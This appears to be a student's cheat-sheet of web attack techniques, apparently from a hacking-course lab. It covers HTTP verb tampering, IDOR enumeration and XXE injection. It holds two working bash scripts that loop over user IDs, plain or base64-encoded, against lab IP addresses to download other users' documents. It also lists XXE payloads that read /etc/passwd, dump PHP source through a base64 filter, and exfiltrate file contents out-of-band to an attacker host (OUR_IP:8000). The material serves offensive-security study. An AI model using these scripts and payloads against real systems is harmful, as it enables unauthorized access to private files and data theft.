## HTTP Verb Tampering
```
HEAD
PUT
DELETE
OPTIONS
PATCH
```

## IDOR
Identify IDORs in
- URL parameters & APIs
- AJAX calls
- understanding reference hashing/encoding
- comparing user roles
```
md5sum
base64
```

```
#!/bin/bash
 2
 3 url="http://83.136.255.170:55120"
 4
 5 for i in {1..20}; do
 6         for link in $(curl -X POST -d "uid=$i" -H "Content-Type: application/x-www-form-urlencoded" $url/documents.php | grep -oP "/documents/[^\"']+\.txt"); do
 7                 wget -q $url/$link
 8         done
 9 done
```

```
#!/bin/bash
 2
 3 for i in {1..20}; do
 4     for hash in $(echo -n $i | base64 -w 0); do
 5         curl "http://94.237.123.185:54572/download.php?contract=$hash"
 6     done
 7 done
```

## XXE
```
<!ENTITY xxe SYSTEM "http://localhost/email.dtd">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
